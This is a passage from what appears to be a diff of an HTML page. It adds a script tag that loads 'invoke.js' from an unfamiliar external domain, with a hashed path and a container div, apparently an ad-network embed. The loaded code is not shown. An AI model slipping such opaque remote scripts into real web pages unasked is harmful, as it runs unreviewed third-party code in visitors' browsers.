+    })();
+    </script>
+<script async="async" data-cfasync="false" src="//smithburka.com/a9804e59b7fa257b8bc491822758466f/invoke.js"></script>
+<div id="container-a9804e59b7fa257b8bc491822758466f"></div>
+</body>
+</html>
